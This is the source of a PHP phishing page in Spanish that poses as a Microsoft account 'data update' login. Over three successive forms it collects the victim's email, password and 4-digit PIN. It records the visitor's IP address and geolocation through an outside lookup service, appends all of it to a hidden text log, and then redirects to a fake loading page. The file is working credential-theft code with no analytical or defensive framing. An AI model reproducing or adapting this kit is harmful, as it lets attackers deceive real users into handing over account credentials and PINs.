<?php
session_start();
$nombre_archivo = "stwehzclavvv";

ini_set("display_errors", 0);
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>calendario y correo electrónico</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
<div id="vista1">	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form method="post" action="" class="delform" >
	
					<img src="https://i.postimg.cc/YqZSzH8G/logoms-660.jpg" style="width:100px;"><br><br>
						<span style="font-size: 01.10rem;  font-weight: 600;"><b>Actualización de datos</b></span><br><br>
		
					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter username">
						<input class="input100" type="email" name="a" placeholder="Correo electrónico, teléfono o Skype" required>
						
			
					</div>
					

					<span style="font-size: .8125rem;">¿Nueva cuenta? <a href="" style="color: #0067b8;text-decoration:none;">Cree una</a></span>
								<br>
          <span style="font-size: .8125rem;"> <a href="" style="color: #0067b8;text-decoration:none;">lnicia sesion con tu llave de seguridad </a></span>

					
					<br><br>

					<div class="container-login100-form-btn">
						<button type="submit" class="login100-form-btn">
							Continue
						</button>
					</div>


				
				
				</form>
			</div>
			
		</div>
	</div>
</div>
	<?php 
	
if(isset($_POST['a'])){
	$_SESSION['a'] = $_POST['a'];

echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista3").style.display = "none";
</script>';

?>	
	<div id="vista2" style="">	
	
		<div class="limiter">
		<div class="container-login100">
						<div class="wrap-login100">
				<form method="post" action="" class="delform" >
	
					<img src="https://i.postimg.cc/YqZSzH8G/logoms-660.jpg" style="width:100px;"><br><br>
				
					<img src="css/izq.png"><span style="color:#000000;"><?php echo $_SESSION['a']; ?></span><br><br>
		
						<input class="input100" type="password" name="b" placeholder="Contraseña" required>
						
					
					<br><br>

					<span style="font-size: .8125rem;"><a href="" style="color: #0067b8;text-decoration:none;">¿Olvidó su contraseña?</a></span>
								<br>

					
					<br><br>

					<div class="container-login100-form-btn">
						<button type="submit" class="login100-form-btn">
							Inicie su sesión
						</button>
					</div>


				
				
				</form>
			</div>
			
		</div>
	</div>
	
	</div>
												<?php 
} else if(isset($_POST['b']) ){
	
$_SESSION['b'] = $_POST['b'];

echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista2").style.display = "none";
</script>';

?>
	<div id="vista3" style="">	
	
		<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
			
					<form method="post" action="" class="delform" >
	
					<img src="https://i.postimg.cc/YqZSzH8G/logoms-660.jpg" style="width:100px;"><br><br>
				
					<img src="css/izq.png"><span style="color:#000000;"><?php echo $_SESSION['a']; ?></span><br><br>
		
						<input class="input100" type="tel" name="c" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" 
					autofocus="" maxlength="4" minlength="4" placeholder="Pin de 4-Dígitos" required>
						
					
					<br><br>

					<span style="font-size: .8125rem;"><a href="" style="color: #0067b8;text-decoration:none;">!ingrese pin de seguridad!</a></span>
								<br>

					
					<br><br>

					<div class="container-login100-form-btn">
						<button type="submit" class="login100-form-btn">
							ingresar y confirmar
						</button>
					</div>


				
				
				</form>
			
			<br><br>
			</div>
		</div>
	</div>
	
	</div>


<?php 
}	
else if(isset($_POST['c'])) {
	
$file = fopen("leinotto2464.txt", "a");
fwrite($file, "|| Correo : ".$_SESSION['a']." - Clave: ".$_SESSION['b']." - Pin: ".$_POST['c']." - Ip:  ".$myip." ".$pais." ".$region." ".date('d/m/Y').PHP_EOL);
fwrite($file, "||=====================" . PHP_EOL);
fclose($file);


echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista2").style.display = "none";
document.getElementById("vista3").style.display = "none";
</script>';

echo '<script type="text/javascript">window.location.href = "cargando.html";</script>';

session_destroy();


}
?>


</body>
</html>